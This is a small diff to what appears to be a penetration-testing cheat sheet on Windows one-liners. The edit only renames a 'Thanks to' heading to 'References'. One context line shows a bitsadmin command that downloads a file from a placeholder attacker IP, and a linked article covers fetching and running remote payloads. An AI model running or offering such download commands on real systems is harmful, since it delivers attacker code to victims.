@@ -101,6 +101,6 @@ bitsadmin /transfer mydownloadjob /download /priority normal http://<attackerIP>
 ```
 
 
-## Thanks to
+## References
 
 - [arno0x0x - Windows oneliners to download remote payload and execute arbitrary code](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
